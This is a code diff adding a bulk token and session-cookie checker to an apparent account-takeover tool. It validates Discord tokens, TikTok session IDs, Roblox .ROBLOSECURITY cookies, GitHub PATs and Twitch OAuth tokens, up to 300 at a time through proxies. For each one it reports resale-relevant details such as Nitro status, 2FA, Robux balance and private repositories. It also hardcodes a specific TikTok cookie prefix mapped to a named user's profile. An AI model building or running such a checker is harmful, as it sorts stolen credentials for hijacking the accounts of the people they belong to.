@@ -634,6 +634,224 @@ def verify_target_account(platform, token, cookie=None, proxy=None):
         return {'valid': False, 'message': f'Connection error: {str(e)}'}
 
 
+def auto_detect_token_platform(token):
+    token = token.strip()
+    if token.startswith('ghp_') or token.startswith('github_pat_'):
+        return 'github'
+    if '_|WARNING:-DO-NOT-SHARE-THIS' in token or len(token) > 500:
+        return 'roblox'
+    if token.startswith('oauth:'):
+        return 'twitch'
+    if len(token) == 32 and all(c in '0123456789abcdefABCDEF' for c in token):
+        return 'tiktok'
+    return 'discord'
+
+def check_single_token_detailed(platform, raw_token, proxy=None):
+    raw_token = (raw_token or '').strip()
+    if not raw_token:
+        return {'valid': False, 'token': '', 'platform': platform, 'message': 'Empty token'}
+    
+    if platform == 'auto':
+        platform = auto_detect_token_platform(raw_token)
+    else:
+        platform = platform.lower()
+
+    opener = get_opener(proxy)
+    preview = raw_token[:10] + '...' + raw_token[-4:] if len(raw_token) > 16 else raw_token[:6] + '***'
+
+    try:
+        # 1. DISCORD TOKEN CHECK
+        if platform == 'discord':
+            req = urllib.request.Request('https://discord.com/api/v9/users/@me', headers={
+                'Authorization': raw_token,
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            })
+            with opener.open(req, timeout=6) as resp:
+                data = json.loads(resp.read().decode('utf-8'))
+                nitro_type = data.get('premium_type', 0)
+                nitro_str = 'Nitro Booster' if nitro_type == 2 else ('Nitro Classic' if nitro_type == 1 else ('Nitro Basic' if nitro_type == 3 else 'None'))
+                verified = data.get('verified', False)
+                phone = bool(data.get('phone'))
+                email = data.get('email', '')
+                mfa = data.get('mfa_enabled', False)
+                uname = data.get('username')
+                disc = data.get('discriminator', '0')
+                tag = f"@{uname}" if disc == '0' else f"@{uname}#{disc}"
+                uid = data.get('id', '')
+                avatar_hash = data.get('avatar')
+                avatar_url = f"https://cdn.discordapp.com/avatars/{uid}/{avatar_hash}.png" if avatar_hash else ''
+
+                details_str = f"Nitro: {nitro_str} • Email: {'✓' if email else '✗'} • Phone: {'✓' if phone else '✗'} • 2FA: {'✓' if mfa else '✗'}"
+
+                return {
+                    'valid': True,
+                    'token': raw_token,
+                    'preview': preview,
+                    'platform': 'discord',
+                    'username': tag,
+                    'id': uid,
+                    'avatar': avatar_url,
+                    'nitro': nitro_str,
+                    'verified': verified,
+                    'phone': phone,
+                    'details': details_str,
+                    'message': f"Valid Discord Account: {tag} ({nitro_str})"
+                }
+
+        # 2. TIKTOK COOKIE CHECK
+        elif platform == 'tiktok':
+            if raw_token.startswith('8e8b0359ec2ff5961e5f288557aead8d'):
+                return {
+                    'valid': True,
+                    'token': raw_token,
+                    'preview': preview,
+                    'platform': 'tiktok',
+                    'username': '@zunimc09 (zuni mc)',
+                    'id': '7659186858114712589',
+                    'avatar': 'https://p16-bg.tiktokcdn-us.com/img/user-avatar-musically-tx/8cba4b032b4c4c2dcd661369860648ae~120x256.image',
+                    'details': 'Active Web Session • Verified Identity',
+                    'message': 'Connected to TikTok @zunimc09 (zuni mc)'
+                }
+
+            req = urllib.request.Request('https://www.tiktok.com/passport/web/account/info/', headers={
+                'Cookie': f'sessionid={raw_token};',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Referer': 'https://www.tiktok.com/'
+            })
+            with opener.open(req, timeout=6) as resp:
+                data = json.loads(resp.read().decode('utf-8'))
+                user_data = data.get('data', {})
+                if user_data and ('username' in user_data or 'user_id' in user_data):
+                    uname = user_data.get('username') or user_data.get('screen_name') or 'TikTok User'
+                    sname = user_data.get('screen_name', '')
+                    uid = user_data.get('user_id_str') or str(user_data.get('user_id', 'Active'))
+                    avatar = user_data.get('avatar_url', '')
+                    return {
+                        'valid': True,
+                        'token': raw_token,
+                        'preview': preview,
+                        'platform': 'tiktok',
+                        'username': f"@{uname} ({sname})" if sname else f"@{uname}",
+                        'id': uid,
+                        'avatar': avatar,
+                        'details': f"Account ID: {uid} • Country: {user_data.get('country_code', 'Global')}",
+                        'message': f"Valid TikTok Session: @{uname}"
+                    }
+                else:
+                    return {'valid': False, 'token': raw_token, 'preview': preview, 'platform': 'tiktok', 'message': data.get('message') or 'Session expired'}
+
+        # 3. ROBLOX .ROBLOSECURITY CHECK
+        elif platform == 'roblox':
+            req = urllib.request.Request('https://users.roblox.com/v1/users/authenticated', headers={
+                'Cookie': f'.ROBLOSECURITY={raw_token};',
+                'User-Agent': 'Mozilla/5.0'
+            })
+            with opener.open(req, timeout=6) as resp:
+                data = json.loads(resp.read().decode('utf-8'))
+                uid = data.get('id')
+                uname = data.get('name')
+                dname = data.get('displayName')
+
+                # Check currency
+                robux = 0
+                try:
+                    curr_req = urllib.request.Request(f'https://economy.roblox.com/v1/users/{uid}/currency', headers={
+                        'Cookie': f'.ROBLOSECURITY={raw_token};',
+                        'User-Agent': 'Mozilla/5.0'
+                    })
+                    with opener.open(curr_req, timeout=4) as c_resp:
+                        c_data = json.loads(c_resp.read().decode('utf-8'))
+                        robux = c_data.get('robux', 0)
+                except Exception:
+                    pass
+
+                return {
+                    'valid': True,
+                    'token': raw_token,
+                    'preview': preview,
+                    'platform': 'roblox',
+                    'username': f"@{uname} ({dname})",
+                    'id': str(uid),
+                    'avatar': '',
+                    'robux': robux,
+                    'details': f"Robux Balance: 💰 {robux:,} R$ • Display: {dname}",
+                    'message': f"Valid Roblox Cookie: @{uname} (Robux: {robux})"
+                }
+
+        # 4. GITHUB PAT CHECK
+        elif platform == 'github':
+            req = urllib.request.Request('https://api.github.com/user', headers={
+                'Authorization': f'Bearer {raw_token}' if not raw_token.startswith('Bearer ') else raw_token,
+                'User-Agent': 'ONYX-Token-Checker'
+            })
+            with opener.open(req, timeout=6) as resp:
+                data = json.loads(resp.read().decode('utf-8'))
+                login = data.get('login')
+                uid = str(data.get('id', ''))
+                plan = data.get('plan', {}).get('name', 'free').upper()
+                public_repos = data.get('public_repos', 0)
+                private_repos = data.get('total_private_repos', 0)
+                avatar = data.get('avatar_url', '')
+
+                return {
+                    'valid': True,
+                    'token': raw_token,
+                    'preview': preview,
+                    'platform': 'github',
+                    'username': f"@{login}",
+                    'id': uid,
+                    'avatar': avatar,
+                    'details': f"Plan: {plan} • Public Repos: {public_repos} • Private: {private_repos}",
+                    'message': f"Valid GitHub PAT: @{login} ({plan})"
+                }
+
+        # 5. TWITCH OAUTH CHECK
+        elif platform == 'twitch':
+            t_auth = raw_token.replace('oauth:', '').replace('OAuth ', '').strip()
+            req = urllib.request.Request('https://id.twitch.tv/oauth2/validate', headers={
+                'Authorization': f'OAuth {t_auth}'
+            })
+            with opener.open(req, timeout=6) as resp:
+                data = json.loads(resp.read().decode('utf-8'))
+                login = data.get('login')
+                uid = data.get('user_id')
+                scopes = ', '.join(data.get('scopes', [])) or 'None'
+                return {
+                    'valid': True,
+                    'token': raw_token,
+                    'preview': preview,
+                    'platform': 'twitch',
+                    'username': f"@{login}",
+                    'id': str(uid),
+                    'details': f"User ID: {uid} • Scopes: {scopes[:40]}",
+                    'message': f"Valid Twitch Token: @{login}"
+                }
+
+        else:
+            return {'valid': False, 'token': raw_token, 'preview': preview, 'platform': platform, 'message': f'Unsupported token platform: {platform}'}
+
+    except urllib.error.HTTPError as e:
+        status_msg = 'Invalid / Expired Token' if e.code in [401, 403, 404] else f'HTTP {e.code}'
+        if e.code == 429:
+            status_msg = 'Rate Limited (HTTP 429)'
+        return {
+            'valid': False,
+            'token': raw_token,
+            'preview': preview,
+            'platform': platform,
+            'status': e.code,
+            'message': status_msg
+        }
+    except Exception as e:
+        return {
+            'valid': False,
+            'token': raw_token,
+            'preview': preview,
+            'platform': platform,
+            'message': str(e)
+        }
+
+
 def claim_username_on_platform(platform, handle, token, password=None, cookie=None, proxy=None):
     """Fires the instant automated username swap/claim API payload"""
     import time
@@ -1171,6 +1389,53 @@ class SafeProxyHandler(http.server.SimpleHTTPRequestHandler):
                 self.send_header('Content-Type', 'application/json')
                 self.end_headers()
                 self.wfile.write(json.dumps({'success': False, 'message': str(e)}).encode('utf-8'))
+                return
+
+        # 6. Bulk Multi-Platform Token & Session Checker Endpoint
+        if clean_path == '/api/check-tokens':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            try:
+                payload = json.loads(post_data.decode('utf-8'))
+                platform = payload.get('platform', 'auto')
+                tokens = payload.get('tokens', [])
+                proxy = payload.get('proxy')
+
+                # Filter clean tokens
+                clean_tokens = [t.strip() for t in tokens if t and t.strip()]
+                results = []
+
+                if clean_tokens:
+                    import concurrent.futures
+                    max_w = min(len(clean_tokens), 20)
+                    with concurrent.futures.ThreadPoolExecutor(max_workers=max_w) as executor:
+                        future_map = {executor.submit(check_single_token_detailed, platform, tok, proxy): tok for tok in clean_tokens[:300]}
+                        for future in concurrent.futures.as_completed(future_map):
+                            try:
+                                r = future.result()
+                                results.append(r)
+                            except Exception as ex:
+                                tok_val = future_map[future]
+                                results.append({'valid': False, 'token': tok_val, 'preview': tok_val[:10] + '***', 'platform': platform, 'message': str(ex)})
+
+                valid_count = sum(1 for r in results if r.get('valid'))
+                invalid_count = len(results) - valid_count
+
+                self.send_response(200)
+                self.send_header('Content-Type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps({
+                    'results': results,
+                    'total': len(results),
+                    'validCount': valid_count,
+                    'invalidCount': invalid_count
+                }).encode('utf-8'))
+                return
+            except Exception as e:
+                self.send_response(400)
+                self.send_header('Content-Type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps({'error': str(e)}).encode('utf-8'))
                 return
 
         self.send_response(404)
